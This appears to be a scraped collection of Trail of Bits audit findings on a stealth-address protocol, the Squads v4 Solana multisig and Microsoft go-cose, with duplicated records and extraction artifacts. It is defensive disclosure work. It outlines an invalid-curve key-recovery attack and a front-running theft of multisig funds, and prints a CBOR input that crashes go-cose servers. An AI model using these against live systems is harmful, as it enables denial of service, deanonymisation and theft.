follows the following steps: 1. Find a point  ' which is not on the curve used for ECDH, and a. b. when used in Bobs scalar multiplication, is eectively on a dierent curve  ' 2. 3. 4. with (a subgroup of) small prime order Brute-force all possible values of addresses with shared secret    ' for  (    ' || 0 ) the unique stealth address associated with     ' = (    ' )   ' .   ' . 0   <  ' , i.e.,    ' =   , and sends funds to all +  (    '|| 0 ) *  =   .     ' . This happens because Monitor all resulting addresses associated with until Bob withdraws funds from Repeat steps 13 for new points '   with dierent small prime orders '   to recover  '   .   5. Use the Chinese Remainder Theorem to recover   from   '   .  As a result, Alice can now track all stealth payments made to Bob (but cannot steal funds). To understand the complexity of this attack, it is sucient for Alice to repeat steps 13 for the rst 44 primes (numbers between 2 and 193). This requires Alice to make 3,831 payments in total (corresponding to the sum of the rst 44 primes). There is a tradeo where Alice uses fewer primes, which means that fewer transactions are needed. However, it means that Alice does not recover the full b dh . To compensate for this, Alice can brute-force the discrete logarithm of B dh guided by the partial information on b dh . Because the attack compromises anonymity for a particular user without giving access to funds, we consider this issue to have medium severity. As this is a complicated attack with various assumptions that requires Bob to access the funds from all his stealth addresses, we consider this issue to have high diculty. Recommendations The specication should enforce that public keys are validated for correctness, both when they are added to the public database and when they are used by senders and receivers. These validations should include point-on-curve checks, small-order-subgroup checks (if applicable), and point-at-innity checks. References   Dierential Fault Attacks on Elliptic Curve Cryptosystems, Biehl et al., 2000 Elliptic Curve Cryptosystems in the Presence of Permanent and Transient Faults, Ciet et al.,", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "1. Reliance on vulnerable dependencies ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf", "body": "Although dependency scans did not uncover a direct threat to the codebase, cargo-audit identied dependencies with known vulnerabilities. It is important to ensure that dependencies are not malicious. Problems with Rust dependencies could have a signicant eect on the system as a whole. The table below shows the output detailing the identied issues. Package Advisory Cargo.lock version Upgrade to ed25519-dalek Double public key signing function oracle attack on ed25519-dalek 1.0.1  2.0.0 h2 Resource exhaustion vulnerability in h2 may lead to denial of service (DoS) 0.3.15  0.3.17 time Potential segfault in the time crate 0.1.45  0.2.23 webpki webpki: CPU denial of service in certicate path building 0.22.0  0.22.1 ansi_term ansi_term is unmaintained 0.12.1 N/A dlopen_derive dlopen_derive is unmaintained 0.2.4 N/A atty Potential unaligned read 0.2.14 N/A borsh tokio Parsing borsh messages with ZST which are not-copy/clone is unsound 0.9.3 N/A tokio::io::ReadHalf<T>::unsplit is Unsound 1.24.1 N/A crossbeam- channel Yanked 0.5.6 0.5.8 ed25519 Yanked 1.5.2 1.5.3 Table 1.1: Vulnerabilities reported by cargo-audit Note that several of the vulnerabilities can be eliminated by simply updating the associated dependency. Exploit Scenario Mallory notices that the Squads multisig program exercises code from one of the vulnerable dependencies in table 1.1. Mallory uses the associated bug to steal funds from Alices multisig wallet. Recommendations Short term, ensure that dependencies are up to date and verify their integrity after installation. As mentioned above, several of the vulnerabilities currently aecting Squads v4s dependencies can be eliminated by simply upgrading the associated dependencies. Thus, keeping dependencies up to date can help prevent many vulnerabilities. Long term, consider integrating automated dependency auditing into the development workow. If dependencies cannot be updated when a vulnerability is disclosed, ensure that the codebase does not use it and is not aected by the vulnerable functionality of the dependency. 2. Insu\u0000cient linter use Severity: Informational Diculty: High Type: Patching Finding ID: TOB-SQUADS-2 Target: Various source les", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "3. Lack of build instructions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf", "body": "The Squads v4 repository contains information for verifying the deployed program, but lacks other essential information. The repositorys README should include at least the following:  Instructions for building the project  Instructions for running the built artifacts  Instructions for running the projects tests For example, running the projects Anchor tests is nontrivial. Figure 3.1 shows how the tests are run in CI: 75 76 77 78 79 80 - name: Build Program run: yarn build - name: Replace Program keypair in target/deploy run: | echo -n \"${{ secrets.MULTISIG_PROGRAM_KEYPAIR }}\" > ./target/deploy/squads_multisig_program-keypair.json 81 82 83 - name: Run Tests run: yarn test Figure 3.1: How the projects Anchor tests are run in CI (.github/workflows/reusable-tests.yaml#7583) Steps like those in gure 3.1 should be documented to help ensure that developers perform them correctly. Exploit Scenario Alice, a Solana developer, tries to build the Squads multisig program, but a mistake in her procedure causes it to behave incorrectly. Recommendations Short term, add the minimum information listed above to the repositorys README. This will help developers to build, run, and test the project. Long term, as the project evolves, ensure that the README is updated. This will help ensure that they do not communicate incorrect information to users.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Functions invariant and invalidate_prior_transactions called in wrong order ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf", "body": "In several places within the Squads multisig program, the invariant method is called prior to the invalidate_prior_transactions method. However, invalidate_prior_transactions modies the stale_transaction_index eld, which invariant checks. Hence, it would make more sense to call invariant after calling invalidate_prior_transactions. The denition of invalidate_prior_transactions and the relevant portion of invariant appear in gures 4.1 and 4.2, respectively. An example where this issue occurs appears in gure 4.3. 175 176 /// Makes the transactions created up until this moment stale. /// Should be called whenever any multisig parameter related to the voting consensus is changed. 177 178 179 pub fn invalidate_prior_transactions(&mut self) { self.stale_transaction_index = self.transaction_index; } Figure 4.1: Denition of invalidate_prior_transactions (programs/squads_multisig_program/src/state/multisig.rs#175179) 166 // `state.stale_transaction_index` must be less than or equal to `state.transaction_index`. require!( 167 168 169 170 stale_transaction_index <= transaction_index, MultisigError::InvalidStaleTransactionIndex ); Figure 4.2: Relevant portion of invariant (programs/squads_multisig_program/src/state/multisig.rs#166170) 79 pub fn multisig_add_member(ctx: Context<Self>, args: MultisigAddMemberArgs) -> Result<()> { 108 109 110 111 112 113 ... multisig.invariant()?; multisig.invalidate_prior_transactions(); Ok(()) } Figure 4.3: Example where invariant is called prior to invalidate_prior_transactions (programs/squads_multisig_program/src/instructions/multisig_config.rs#79 113) This issue aects the following locations:  programs/squads_multisig_program/src/instructions/multisig_config .rs#L108-L110  programs/squads_multisig_program/src/instructions/multisig_config .rs#L139-L141  programs/squads_multisig_program/src/instructions/multisig_config .rs#L159-L161  programs/squads_multisig_program/src/instructions/multisig_config .rs#L176-L178  programs/squads_multisig_program/src/instructions/multisig_config .rs#L196-L198 Note that this nding is informational since the existence of the invariant method exceeds industry norms. Exploit Scenario The invalidate_prior_transactions method is modied in a way that causes it to no longer satisfy the invariant method. The Squads multisig program is deployed with the modication. The bug might have been caught prior to deployment if the methods had been called in the reverse order. Recommendations Short term, reverse the order of the calls to invariant and invalidate_prior_transactions in all of the locations listed above. Doing so will ensure that invalidate_prior_transactionss modications of the stale_transaction_index eld preserve the invariant. Long term, as new instructions are added to the multisig program, ensure that invariant is always the last thing called. Adopting such a policy will help to prevent future code from introducing bugs. 5. Insu\u0000cient test coverage Severity: Informational Diculty: High Type: Testing Finding ID: TOB-SQUADS-5 Target: test subdirectory", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Attacker can front-run multisig creation transaction ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf", "body": "A multisig account is derived from an unauthenticated create_key. An attacker can front-run a users multisig creation transaction and create the multisig with their own parameters, allowing them to perform transactions from that multisig. The attacker can steal tokens from the multisig vaults if the user is unaware of the front-running and continues to use the multisig. A multisig account is a PDA derived from the key of the create_key account (gure 7.1). 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #[derive(Accounts)] #[instruction(args: MultisigCreateArgs)] pub struct MultisigCreate<'info> { #[account( init, payer = creator, space = Multisig::size(args.members.len()), seeds = [SEED_PREFIX, SEED_MULTISIG, create_key.key().as_ref()], bump )] pub multisig: Account<'info, Multisig>, /// A random public key that is used as a seed for the Multisig PDA. /// CHECK: This can be any random public key. pub create_key: AccountInfo<'info>, Figure 7.1: Accounts struct for the multisig_create instruction in (programs/squads_multisig_program/src/instructions/multisig_create.rs#20 34) The create_key account is not authenticated; any user can call the multisig_create instruction with any create_key account and initialize the corresponding multisig account. As a result, an attacker monitoring new transactions can check for multisig creation transactions and front-run these transactions by copying the create_key account and then creating the multisig account themselves. Because the attacker is creating the multisig, they can set their own values for members. The attacker could make minimal changes to the members list that go unnoticed and then perform operations on the multisig (e.g., transfer tokens from the vaults), after some activity by the original users. Exploit Scenario 1. Alice, a user of Squads protocol, tries to create a multisig. Eve creates the multisig using Alice's create_key with a modied members list. Alice notices the modication and tries to create another multisig account. However, Eve constantly front-runs Alices transactions and hinders her experience of using Squads protocol. 2. Bob, another user of Squads protocol, tries to create a multisig with threshold set to three and members to 10 keys. Eve creates the multisig using Bobs create_key with a modied members list containing three of her own keys. Bob does not notice the modication and his team continues to use the multisig. After some time, the tokens in the multisig vaults accumulate to one million USD. Eve uses her keys in the members list and steals the tokens. Recommendations Short term, check that the create_key account has signed the multisig_create instruction. This allows only the owner of the create_key to create the corresponding multisig. Long term, consider the front-running risks while determining the authentication requirements for the instructions in the program. Use negative tests to ensure the program meets those requirements.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "8. Program uses same set of ephemeral keys for all transactions in a batch ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf", "body": "The same set of ephemeral keys is used for multiple transactions of a batch. As a result, the transactions may fail to execute if they require the ephemeral keys to be unique for each of the transactions. The ephemeral keys are temporary PDA accounts that sign the vault transactions. They are intended to be used as one-time keys or accounts by the transaction. For example, an ephemeral key could be used to create a mint account or a token account, as the key is not required after setting the proper authority. Because multiple accounts cannot be created using the same ephemeral account, this use case requires that ephemeral keys are unique for each of the transactions. However, for a batch transaction, which may contain multiple vault transactions, the ephemeral keys are derived from the batch transactions account key. As a result, the derived ephemeral keys will be the same for all transactions in that batch (gure 8.1). 106 107 108 /// Add a transaction to the batch. #[access_control(ctx.accounts.validate())] pub fn batch_add_transaction(ctx: Context<Self>, args: BatchAddTransactionArgs) -> Result<()> { 117 118 119 120 121 122 123 124 125 126 127 128 [...] let ephemeral_signer_bumps: Vec<u8> = (0..args.ephemeral_signers) .into_iter() .map(|ephemeral_signer_index| { let ephemeral_signer_seeds = &[ SEED_PREFIX, batch_key.as_ref(), SEED_EPHEMERAL_SIGNER, &ephemeral_signer_index.to_le_bytes(), ]; let (_, bump) = Pubkey::find_program_address(ephemeral_signer_seeds, ctx.program_id); 129 130 131 132 bump }) .collect(); Figure 8.1: A snippet of batch_add_transaction instruction in (programs/squads_multisig_program/src/instructions/batch_add_transaction. rs#106132) If two of the transactions in a batch try to create a new account using the ephemeral key, then the second transaction will fail to execute, as an account would have already been initialized under the ephemeral key by the rst transaction. Also, because the transactions in the batch are executed sequentially, the transactions after the failed transaction cannot be executed either. The users would have to create new transactions and go through the transaction approval process again to perform the operations. Exploit Scenario Bob and his team use the Squads protocol for treasury management. The team intends to deploy a new protocol. The deployment process involves successful execution of a batch transaction from the multisig, which creates new mint accounts for the program and transfers tokens from the multisig vaults to the program-owned token accounts. Bob, unaware of the issue, creates a batch such that the rst and second transactions create mint accounts using the ephemeral keys. The next ve transactions transfer tokens and handle other operations required for deployment. The batch transaction is approved by the team and Bob tries to execute each transaction after the timelock of one week. The execution of the second transaction fails and the transactions after that cannot be executed. Bob, unsure of the issue, creates regular vault transactions for the last six unexecuted transactions. The team has to approve each transaction and Bob has to execute them after the timelock. This creates a noticeable delay in the deployment of Bobs protocol. Recommendations Short term, derive the ephemeral keys using the key of the account used to store the individual transactions in the batch. Doing so will result in unique ephemeral keys for each transaction. Long term, as recommended in TOB-SQUADS-5, expand the projects tests to ensure that the program is behaving as expected for all intended use cases. 9. Ine\u0000cient lookup table account verication during transaction execution Severity: Informational Diculty: Low Type: Undened Behavior Finding ID: TOB-SQUADS-9 Target: programs/squads_multisig_program/src/utils/executable_transaction_me ssage.rs", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "1. Reliance on vulnerable dependencies ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf", "body": "Although dependency scans did not uncover a direct threat to the codebase, cargo-audit identied dependencies with known vulnerabilities. It is important to ensure that dependencies are not malicious. Problems with Rust dependencies could have a signicant eect on the system as a whole. The table below shows the output detailing the identied issues. Package Advisory Cargo.lock version Upgrade to ed25519-dalek Double public key signing function oracle attack on ed25519-dalek 1.0.1  2.0.0 h2 Resource exhaustion vulnerability in h2 may lead to denial of service (DoS) 0.3.15  0.3.17 time Potential segfault in the time crate 0.1.45  0.2.23 webpki webpki: CPU denial of service in certicate path building 0.22.0  0.22.1 ansi_term ansi_term is unmaintained 0.12.1 N/A dlopen_derive dlopen_derive is unmaintained 0.2.4 N/A atty Potential unaligned read 0.2.14 N/A borsh tokio Parsing borsh messages with ZST which are not-copy/clone is unsound 0.9.3 N/A tokio::io::ReadHalf<T>::unsplit is Unsound 1.24.1 N/A crossbeam- channel Yanked 0.5.6 0.5.8 ed25519 Yanked 1.5.2 1.5.3 Table 1.1: Vulnerabilities reported by cargo-audit Note that several of the vulnerabilities can be eliminated by simply updating the associated dependency. Exploit Scenario Mallory notices that the Squads multisig program exercises code from one of the vulnerable dependencies in table 1.1. Mallory uses the associated bug to steal funds from Alices multisig wallet. Recommendations Short term, ensure that dependencies are up to date and verify their integrity after installation. As mentioned above, several of the vulnerabilities currently aecting Squads v4s dependencies can be eliminated by simply upgrading the associated dependencies. Thus, keeping dependencies up to date can help prevent many vulnerabilities. Long term, consider integrating automated dependency auditing into the development workow. If dependencies cannot be updated when a vulnerability is disclosed, ensure that the codebase does not use it and is not aected by the vulnerable functionality of the dependency.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "2. Insu\u0000cient linter use ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf", "body": "The Squads multisig program does not appear to be linted by Clippy regularly. The Clippy linter contains hundreds of lints to help catch common mistakes and improve Rust code. Clippy should be run on most projects regularly. Running Clippy with no ags (not even -W clippy::pedantic) over the Squads multisig program produces several warnings. Examples appear in gure 2.1. warning: useless conversion to the same type: `std::ops::Range<u8>` --> programs/squads_multisig_program/src/instructions/batch_add_transaction.rs:117:47 | 117 | let ephemeral_signer_bumps: Vec<u8> = (0..args.ephemeral_signers) | _______________________________________________^ 118 | | .into_iter() | |________________________^ help: consider removing `.into_iter()`: `(0..args.ephemeral_signers)` | = help: for further information visit https://rust-lang.github.io/rust-clippy/master/index.html#useless_conversion = note: `#[warn(clippy::useless_conversion)]` on by default warning: this expression creates a reference which is immediately dereferenced by the compiler --> programs/squads_multisig_program/src/instructions/config_transaction_execute.rs:175: 29 | 175 | ... | | = help: for further information visit &SEED_PREFIX, ^^^^^^^^^^^^ help: change this to: `SEED_PREFIX` https://rust-lang.github.io/rust-clippy/master/index.html#needless_borrow = note: `#[warn(clippy::needless_borrow)]` on by default ... Figure 2.1: Sample warnings produced by running Clippy over the codebase Exploit Scenario Mallory uncovers a bug in the Squads multisig program. The bug might have been caught if Squads developers had enabled additional lints. Recommendations Short term, review all of the warnings currently generated by Clippys default lints. Address those for which it makes sense to do so. Disable others using allow attributes. Taking these steps will produce cleaner code, which in turn will reduce the likelihood that the code contains bugs. Long term, take the following steps:  Regularly run Clippy with -W clippy::pedantic enabled. The pedantic lints provide additional suggestions to help improve the quality of code.  Regularly review Clippy lints that have been allowed to see whether they should still be given such an exemption. Allowing a Clippy lint unnecessarily could cause bugs to be missed.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Functions invariant and invalidate_prior_transactions called in wrong order ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf", "body": "In several places within the Squads multisig program, the invariant method is called prior to the invalidate_prior_transactions method. However, invalidate_prior_transactions modies the stale_transaction_index eld, which invariant checks. Hence, it would make more sense to call invariant after calling invalidate_prior_transactions. The denition of invalidate_prior_transactions and the relevant portion of invariant appear in gures 4.1 and 4.2, respectively. An example where this issue occurs appears in gure 4.3. 175 176 /// Makes the transactions created up until this moment stale. /// Should be called whenever any multisig parameter related to the voting consensus is changed. 177 178 179 pub fn invalidate_prior_transactions(&mut self) { self.stale_transaction_index = self.transaction_index; } Figure 4.1: Denition of invalidate_prior_transactions (programs/squads_multisig_program/src/state/multisig.rs#175179) 166 // `state.stale_transaction_index` must be less than or equal to `state.transaction_index`. require!( 167 168 169 170 stale_transaction_index <= transaction_index, MultisigError::InvalidStaleTransactionIndex ); Figure 4.2: Relevant portion of invariant (programs/squads_multisig_program/src/state/multisig.rs#166170) 79 pub fn multisig_add_member(ctx: Context<Self>, args: MultisigAddMemberArgs) -> Result<()> { 108 109 110 111 112 113 ... multisig.invariant()?; multisig.invalidate_prior_transactions(); Ok(()) } Figure 4.3: Example where invariant is called prior to invalidate_prior_transactions (programs/squads_multisig_program/src/instructions/multisig_config.rs#79 113) This issue aects the following locations:  programs/squads_multisig_program/src/instructions/multisig_config .rs#L108-L110  programs/squads_multisig_program/src/instructions/multisig_config .rs#L139-L141  programs/squads_multisig_program/src/instructions/multisig_config .rs#L159-L161  programs/squads_multisig_program/src/instructions/multisig_config .rs#L176-L178  programs/squads_multisig_program/src/instructions/multisig_config .rs#L196-L198 Note that this nding is informational since the existence of the invariant method exceeds industry norms. Exploit Scenario The invalidate_prior_transactions method is modied in a way that causes it to no longer satisfy the invariant method. The Squads multisig program is deployed with the modication. The bug might have been caught prior to deployment if the methods had been called in the reverse order. Recommendations Short term, reverse the order of the calls to invariant and invalidate_prior_transactions in all of the locations listed above. Doing so will ensure that invalidate_prior_transactionss modications of the stale_transaction_index eld preserve the invariant. Long term, as new instructions are added to the multisig program, ensure that invariant is always the last thing called. Adopting such a policy will help to prevent future code from introducing bugs.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Insu\u0000cient test coverage ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf", "body": "Signicant portions of the multisig program are untested. Squads Protocol should strive for near 100% test coverage to help ensure condence in the code. The following are some of the limitations of the programs current Anchor tests:  The three instructions multisig_remove_member, multisig_set_time_lock, and multisig_set_config_authority are untested (programs/squads_multisig_program/src/lib.rs#L42-L64).  The use of ephemeral signer seeds in batch transitions is untested (programs/squads_multisig_program/src/instructions/batch_add_transaction.rs#L11 9-L131).  Of the six possible ConfigActions, only SetTimeLock is tested (programs/squads_multisig_program/src/instructions/cong_transaction_execute.rs #L139-L275).  The following blocks within config_transaction_execute are untested:  programs/squads_multisig_program/src/instructions/cong_transaction_exec ute.rs#L114-L135  programs/squads_multisig_program/src/instructions/cong_transaction_exec ute.rs#L279-L285  programs/squads_multisig_program/src/instructions/cong_transaction_exec ute.rs#L312-L316  The use of periods in spending limits is untested (programs/squads_multisig_program/src/instructions/spending_limit_use.rs#L156-L 170). Additional testing might have revealed TOB-SQUADS-8, for example. Exploit Scenario A bug is found in one of the above pieces of case. The bug could have been exposed by more thorough Anchor tests. Recommendations Short term, add or expand the projects Anchor tests to address each of the above noted deciencies. Doing so will help increase condence in the multisig programs code. Long term, regularly review the multisig programs tests. Doing so will help ensure that the tests are relevant and that all important conditions are tested.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Insu\u0000cient logging ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf", "body": "Log messages generated during program execution aid in monitoring, baselining behavior, and detecting suspicious activity. Without log messages, users and blockchain monitoring systems cannot easily detect behavior that falls outside the baseline conditions. This may prevent malfunctioning programs or malicious attacks from being discovered. At a minimum, each instruction should log the following information:  The instructions arguments  Addresses of signicant accounts involved, and the roles they played  The instructions eects  Non-obvious code paths taken by the instruction Note that program logs are displayed in tools Solana Explorer and Solana Beach. Thus, such information benets users (i.e., humans) in addition to blockchain monitoring tools. The Squads multisig does perform some limited logging now using the msg! macro. The following is a complete list of the locations where the macro is used:  config_transaction_create.rs:99  vault_transaction_create.rs:129  spending_limit_use.rs:231  batch_create.rs:100  batch_add_transaction.rs:142  batch_add_transaction.rs:143 Exploit Scenario An attacker discovers a vulnerability in the Squads multisig program and exploits it. Because the actions generate no log messages, the behavior goes unnoticed until there is follow-on damage, such as nancial loss. Recommendations Short term, add the minimal logging information listed above to each instruction. Doing so will make it easier for blockchain monitoring systems to detect problems with Squads multisig wallets. It will also make it easier for users to review past transactions. Long term, consider using a blockchain monitoring system to track any suspicious behavior in the programs. A monitoring mechanism for critical events would quickly detect any compromised system components. Additionally, develop an incident response plan if Squads Protocol does not already have one. Doing so will help ensure that issues are dealt with promptly and without confusion.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Attacker can front-run multisig creation transaction ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf", "body": "A multisig account is derived from an unauthenticated create_key. An attacker can front-run a users multisig creation transaction and create the multisig with their own parameters, allowing them to perform transactions from that multisig. The attacker can steal tokens from the multisig vaults if the user is unaware of the front-running and continues to use the multisig. A multisig account is a PDA derived from the key of the create_key account (gure 7.1). 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #[derive(Accounts)] #[instruction(args: MultisigCreateArgs)] pub struct MultisigCreate<'info> { #[account( init, payer = creator, space = Multisig::size(args.members.len()), seeds = [SEED_PREFIX, SEED_MULTISIG, create_key.key().as_ref()], bump )] pub multisig: Account<'info, Multisig>, /// A random public key that is used as a seed for the Multisig PDA. /// CHECK: This can be any random public key. pub create_key: AccountInfo<'info>, Figure 7.1: Accounts struct for the multisig_create instruction in (programs/squads_multisig_program/src/instructions/multisig_create.rs#20 34) The create_key account is not authenticated; any user can call the multisig_create instruction with any create_key account and initialize the corresponding multisig account. As a result, an attacker monitoring new transactions can check for multisig creation transactions and front-run these transactions by copying the create_key account and then creating the multisig account themselves. Because the attacker is creating the multisig, they can set their own values for members. The attacker could make minimal changes to the members list that go unnoticed and then perform operations on the multisig (e.g., transfer tokens from the vaults), after some activity by the original users. Exploit Scenario", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "8. Program uses same set of ephemeral keys for all transactions in a batch ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf", "body": "The same set of ephemeral keys is used for multiple transactions of a batch. As a result, the transactions may fail to execute if they require the ephemeral keys to be unique for each of the transactions. The ephemeral keys are temporary PDA accounts that sign the vault transactions. They are intended to be used as one-time keys or accounts by the transaction. For example, an ephemeral key could be used to create a mint account or a token account, as the key is not required after setting the proper authority. Because multiple accounts cannot be created using the same ephemeral account, this use case requires that ephemeral keys are unique for each of the transactions. However, for a batch transaction, which may contain multiple vault transactions, the ephemeral keys are derived from the batch transactions account key. As a result, the derived ephemeral keys will be the same for all transactions in that batch (gure 8.1). 106 107 108 /// Add a transaction to the batch. #[access_control(ctx.accounts.validate())] pub fn batch_add_transaction(ctx: Context<Self>, args: BatchAddTransactionArgs) -> Result<()> { 117 118 119 120 121 122 123 124 125 126 127 128 [...] let ephemeral_signer_bumps: Vec<u8> = (0..args.ephemeral_signers) .into_iter() .map(|ephemeral_signer_index| { let ephemeral_signer_seeds = &[ SEED_PREFIX, batch_key.as_ref(), SEED_EPHEMERAL_SIGNER, &ephemeral_signer_index.to_le_bytes(), ]; let (_, bump) = Pubkey::find_program_address(ephemeral_signer_seeds, ctx.program_id); 129 130 131 132 bump }) .collect(); Figure 8.1: A snippet of batch_add_transaction instruction in (programs/squads_multisig_program/src/instructions/batch_add_transaction. rs#106132) If two of the transactions in a batch try to create a new account using the ephemeral key, then the second transaction will fail to execute, as an account would have already been initialized under the ephemeral key by the rst transaction. Also, because the transactions in the batch are executed sequentially, the transactions after the failed transaction cannot be executed either. The users would have to create new transactions and go through the transaction approval process again to perform the operations. Exploit Scenario Bob and his team use the Squads protocol for treasury management. The team intends to deploy a new protocol. The deployment process involves successful execution of a batch transaction from the multisig, which creates new mint accounts for the program and transfers tokens from the multisig vaults to the program-owned token accounts. Bob, unaware of the issue, creates a batch such that the rst and second transactions create mint accounts using the ephemeral keys. The next ve transactions transfer tokens and handle other operations required for deployment. The batch transaction is approved by the team and Bob tries to execute each transaction after the timelock of one week. The execution of the second transaction fails and the transactions after that cannot be executed. Bob, unsure of the issue, creates regular vault transactions for the last six unexecuted transactions. The team has to approve each transaction and Bob has to execute them after the timelock. This creates a noticeable delay in the deployment of Bobs protocol. Recommendations Short term, derive the ephemeral keys using the key of the account used to store the individual transactions in the batch. Doing so will result in unique ephemeral keys for each transaction. Long term, as recommended in TOB-SQUADS-5, expand the projects tests to ensure that the program is behaving as expected for all intended use cases.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "9. Ine\u0000cient lookup table account verication during transaction execution ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-squadsv4-securityreview.pdf", "body": "The program does not strictly verify that lookup table accounts given at the time of execution exactly match with the accounts given at the time of transaction initialization. The current implementation performs unnecessary on-chain computation and wastes gas. The Squads protocol allows the usage of the address lookup tables for vault transactions. Each transaction account stores the list of address lookup table accounts and indices of the accounts that will be used by the transaction. The addresses stored in the lookup table account are expected to not change after the initialization of the transaction. This guarantee is provided by checking that the accounts are owned by the solana_address_lookup_table program. The vault_transaction_execute instruction executes the approved transactions. The instruction takes a list of address lookup table accounts that are veried to be the same as the accounts that are given at the time of initialization in ExecutableTransactionMessage::new_validated (gure 9.1). 28 /// `address_lookup_table_account_infos` - AccountInfo's that are expected to correspond to the lookup tables mentioned in `message.address_table_lookups`. 29 30 31 33 34 36 37 /// `vault_pubkey` - The vault PDA that is expected to sign the message. pub fn new_validated( message: &'a VaultTransactionMessage, address_lookup_table_account_infos: &'a [AccountInfo<'info>], [...] ) -> Result<Self> { // CHECK: `address_lookup_table_account_infos` must be valid and be the ones mentioned in `message.address_table_lookups`. `AddressLookupTable`s // require_eq!( 38 39 40 41 42 43 44 address_lookup_table_account_infos.len(), message.address_table_lookups.len(), MultisigError::InvalidNumberOfAccounts ); let lookup_tables: HashMap<&Pubkey, &AccountInfo> = address_lookup_table_account_infos .iter() .map(|maybe_lookup_table| { 45 46 47 // The lookup table account must be owned by SolanaAddressLookupTableProgram. 48 49 require!( maybe_lookup_table.owner == &solana_address_lookup_table_program::id(), 50 51 52 MultisigError::InvalidAccount ); // The lookup table must be mentioned in `message.address_table_lookups`. 53 54 55 56 57 require!( message .address_table_lookups .iter() .any(|lookup| &lookup.account_key == maybe_lookup_table.key), 58 59 60 61 62 MultisigError::InvalidAccount ); Ok((maybe_lookup_table.key, maybe_lookup_table)) }) .collect::<Result<HashMap<&Pubkey, &AccountInfo>>>()?; Figure 9.1: A snippet of ExecutableTransactionMessage::new_validated function showing the validations performed on lookup table accounts (programs/squads_multisig_program/src/utils/executable_transaction_messag e.rs#2862) The new_validated function iterates over the address_lookup_table_account_infos and checks that each of the accounts is owned by the solana_address_lookup_table program and that the account is present in message.address_table_lookups. The function does not strictly validate that both lists match. Requiring that message.address_table_lookups and address_lookup_table_account_infos list the address lookup tables in the same order would result in a more ecient implementation. Exploit Scenario Alice, a Solana developer, writes code that uses a Squads multisig wallets accounts lookup table feature. Alice is unnecessarily charged for gas. The unnecessary charges would be eliminated by a more ecient implementation of the accounts lookup table feature. Recommendations Short term, rewrite the code to zip message.address_table_lookups together with address_lookup_table_account_infos, and go through each of the pairs to verify that they match. Doing so will help protect against incomplete checks and will also make the implementation more ecient. Long term, as recommended in TOB-SQUADS-5, expand the projects tests to ensure that the program is behaving as expected for all intended use cases. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. Unmarshalling can cause a panic if any header labels are unhashable ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-microsoft-go-cose-securityreview.pdf", "body": "The ensureCritical function checks that all critical labels exist in the protected header. The check for each label is shown in Figure 1.1. 161 if _, ok := h[label]; !ok { Figure 1.1: Line 161 of headers.go The label in this case is deserialized from the users CBOR input. If the label is a non-hashable type (e.g., a slice or a map), then Go will runtime panic on line 161. Exploit Scenario Alice wishes to crash a server running go-cose. She sends the following CBOR message to the server: \\xd2\\x84G\\xc2\\xa1\\x02\\xc2\\x84@0000C000C000. When the server attempts to validate the critical headers during unmarshalling, it panics on line 161. Recommendations Short term, add a validation step to ensure that the elements of the critical header are valid labels. Long term, integrate go-coses existing fuzz tests into the CI pipeline. Although this bug was not discovered using go-coses preexisting fuzz tests, the tests likely would have discovered it if they ran for enough time. Fix Analysis This issue has been resolved. Pull request #78, committed to the main branch in b870a00b4a0455ab5c3da1902570021e2bac12da, adds validations to ensure that critical headers are only integers or strings. 15 Microsoft go-cose Security Assessment (DRAFT)", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "2. crit label is permitted in unvalidated headers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-microsoft-go-cose-securityreview.pdf", "body": "The crit header parameter identies which header labels must be understood by an application receiving the COSE message. Per RFC 8152, this value must be placed in the protected header bucket, which is authenticated by the message signature. Figure 2.1: Excerpt from RFC 8152 section 3.1 Currently, the implementation ensures during marshaling and unmarshaling that if the crit parameter is present in the protected header, then all indicated labels are also present in the protected header. However, the implementation does not ensure that the crit parameter is not present in the unprotected bucket. If a user mistakenly uses the unprotected header for the crit parameter, then other conforming COSE implementations may reject the message and the message may be exposed to tampering. Exploit Scenario A library user mistakenly places the crit label in the 